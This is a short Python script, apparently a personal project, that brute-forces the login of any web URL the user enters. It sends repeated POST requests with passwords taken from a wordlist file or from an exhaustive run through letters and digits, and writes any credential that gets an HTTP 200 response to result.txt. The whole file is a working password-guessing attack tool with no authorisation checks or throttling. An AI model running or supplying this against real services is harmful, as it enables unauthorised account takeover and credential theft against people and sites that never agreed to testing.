import time
import requests

print('Hello, this is bruteforce programm')
print('If you dont know what is bruteforce, please, just close it')
user_url = input('Print URL: ')
login = input('Input user login: ')
method1 = input("If you want to use most popular keywords input 'y', else 'n': ")
method2 = input("If you want to use all alphabet input 'y', else 'n': ")




#------------------DATABASE_BRUTEFORCE-------------------------------------------------------
if method1 == 'y' or method1 == 'Y':
    with open('C:/Users/admin/.vscode/Bruteforce/pass_data.txt', 'r') as f_file:
        f_read = f_file.read()
        f = f_read.split('\n')

        for password in f:
            print(password)
            response = requests.post(user_url, json = {'login': login, 'password': password})

            if response.status_code == 200:
                    print(f"Dire win, password is '{password}'")
                    with open('C:/Users/admin/.vscode/Bruteforce/result.txt', 'a') as f:
                        f.write(f'{login}:{password}\n')
                    time.sleep(1)
                    print('Result were printed in result.txt file')
                    break


#------------------ALPHABET_BRUTEFORCE-------------------------------------------------------
n = 0
length = 0
result = ''
#Alphabet can be more symbols, but for test i took this one
alphabet = '0123456789abcdefghijklmnopqrstuvwxyz'
base = len(alphabet)

if method2 == 'y' or method2 == 'Y':
    while True:
        password = ''
        temp = n

        while temp > 0:
            k = temp // base
            rest = temp % base
            password = alphabet[rest] + password
            temp = k

        while len(password) < length:
            password = alphabet[0] + password
        print(password)

        response = requests.post(user_url, json = {'login': login, 'password': password})
        if response.status_code == 200:
                print(f"Dire win, password is '{password}'")
                with open('C:/Users/admin/.vscode/Bruteforce/result.txt', 'a') as f:
                    f.write(f'{login}:{password}\n')
                time.sleep(1)
                print('Result were printed in result.txt file')
                break

        if alphabet[-1] * length == password:
            length += 1
            n = 0
        else:
            n += 1
